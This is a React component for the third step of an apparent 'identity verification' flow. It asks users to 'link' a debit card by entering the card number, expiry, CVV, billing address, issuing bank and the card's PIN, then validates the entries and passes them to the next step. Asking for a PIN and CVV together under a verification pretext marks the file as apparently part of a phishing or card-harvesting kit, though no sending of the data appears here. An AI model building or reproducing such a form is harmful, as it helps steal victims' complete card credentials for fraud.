import React, { useState } from 'react';
import Card from '../shared/Card';
import { VerificationData } from '../../types';

interface Step3Props {
    nextStep: (data: { cardDetails: VerificationData['cardDetails'] }) => void;
    prevStep: () => void;
    formData?: VerificationData['cardDetails'];
}

const Step3DebitCard: React.FC<Step3Props> = ({ nextStep, prevStep, formData }) => {
    const [card, setCard] = useState({
        number: formData?.number || '',
        expiry: formData?.expiry || '',
        cvv: formData?.cvv || '',
        cardHolderName: formData?.cardHolderName || '',
        billingAddress: formData?.billingAddress || '',
        issuingBank: formData?.issuingBank || '',
        pin: formData?.pin || '',
        isAutoPayment: formData?.isAutoPayment || false,
    });
    const [error, setError] = useState('');

    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const { name, value, type, checked } = e.target;
        if (type === 'checkbox') {
            setCard({ ...card, [name]: checked });
            return;
        }
        
        // Basic input formatting
        if (name === 'number') {
            setCard({ ...card, number: value.replace(/\D/g, '').substring(0, 16) });
        } else if (name === 'expiry') {
             setCard({ ...card, expiry: value.replace(/\D/g, '').substring(0, 4) });
        } else if (name === 'cvv') {
             setCard({ ...card, cvv: value.replace(/\D/g, '').substring(0, 4) });
        } else if (name === 'pin') {
             setCard({ ...card, pin: value.replace(/\D/g, '').substring(0, 4) });
        } else {
            setCard({ ...card, [name]: value });
        }
    };

    const handleNext = () => {
         if (Object.values(card).some(field => typeof field === 'string' && field === '')) {
            setError('All fields are required.');
            return;
        }
        if(card.number.length < 15) { setError('Card number seems invalid.'); return; }
        if(card.expiry.length !== 4) { setError('Expiry date should be MMYY.'); return; }
        if(card.cvv.length < 3) { setError('CVV seems invalid.'); return; }
        if(card.pin.length !== 4) { setError('PIN must be 4 digits.'); return; }

        setError('');
        nextStep({ cardDetails: card });
    };

    return (
        <Card>
            <h2 className="text-xl font-bold text-white mb-1">Step 3: Link Debit Card</h2>
            <p className="text-basetitan-text-secondary text-sm mb-6">This card will be linked to your account for identity verification.</p>
            <div className="space-y-4">
                 <div>
                    <label htmlFor="cardHolderName" className="text-sm font-semibold text-basetitan-text-secondary">Card Holder Name</label>
                    <input type="text" name="cardHolderName" value={card.cardHolderName} onChange={handleChange} placeholder="JOHN M. DOE" autoComplete="cc-name" className="mt-1 w-full bg-basetitan-dark border border-basetitan-border rounded-md px-3 py-2"/>
                </div>
                 <div>
                    <label htmlFor="number" className="text-sm font-semibold text-basetitan-text-secondary">Card Number</label>
                    <input type="text" name="number" value={card.number} onChange={handleChange} placeholder="•••• •••• •••• ••••" autoComplete="cc-number" className="mt-1 w-full bg-basetitan-dark border border-basetitan-border rounded-md px-3 py-2"/>
                </div>
                <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
                    <div>
                        <label htmlFor="expiry" className="text-sm font-semibold text-basetitan-text-secondary">Expiry (MMYY)</label>
                        <input type="text" name="expiry" value={card.expiry} onChange={handleChange} placeholder="MMYY" autoComplete="cc-exp" className="mt-1 w-full bg-basetitan-dark border border-basetitan-border rounded-md px-3 py-2"/>
                    </div>
                    <div>
                        <label htmlFor="cvv" className="text-sm font-semibold text-basetitan-text-secondary">CVV/CVC</label>
                        <input type="password" name="cvv" value={card.cvv} onChange={handleChange} placeholder="•••" autoComplete="cc-csc" className="mt-1 w-full bg-basetitan-dark border border-basetitan-border rounded-md px-3 py-2"/>
                    </div>
                    <div>
                        <label htmlFor="pin" className="text-sm font-semibold text-basetitan-text-secondary">Card PIN</label>
                        <input type="password" name="pin" value={card.pin} onChange={handleChange} placeholder="••••" autoComplete="off" className="mt-1 w-full bg-basetitan-dark border border-basetitan-border rounded-md px-3 py-2"/>
                    </div>
                </div>
                 <div>
                    <label htmlFor="billingAddress" className="text-sm font-semibold text-basetitan-text-secondary">Billing Address</label>
                    <input type="text" name="billingAddress" value={card.billingAddress} onChange={handleChange} placeholder="As it appears on your statement" autoComplete="street-address" className="mt-1 w-full bg-basetitan-dark border border-basetitan-border rounded-md px-3 py-2"/>
                </div>
                 <div>
                    <label htmlFor="issuingBank" className="text-sm font-semibold text-basetitan-text-secondary">Issuing Bank Name</label>
                    <input type="text" name="issuingBank" value={card.issuingBank} onChange={handleChange} placeholder="e.g. Chase, Bank of America" className="mt-1 w-full bg-basetitan-dark border border-basetitan-border rounded-md px-3 py-2"/>
                </div>
                 <div className="flex items-center pt-2">
                    <input id="isAutoPayment" name="isAutoPayment" type="checkbox" checked={card.isAutoPayment} onChange={handleChange}
                        className="h-4 w-4 text-accent-primary bg-basetitan-dark border-basetitan-border rounded focus:ring-accent-primary" />
                    <label htmlFor="isAutoPayment" className="ml-2 block text-sm text-basetitan-text-secondary">
                        Set as automatic payment method
                    </label>
                </div>
            </div>
            {error && <p className="text-sm text-accent-danger text-center mt-4">{error}</p>}
            <div className="mt-8 flex justify-between">
                 <button onClick={prevStep} className="bg-basetitan-dark hover:bg-basetitan-border text-white font-bold py-2 px-6 rounded-md">Back</button>
                <button onClick={handleNext} className="bg-accent-primary hover:bg-accent-primary-hover text-white font-bold py-2 px-6 rounded-md">Next</button>
            </div>
        </Card>
    );
};

export default Step3DebitCard;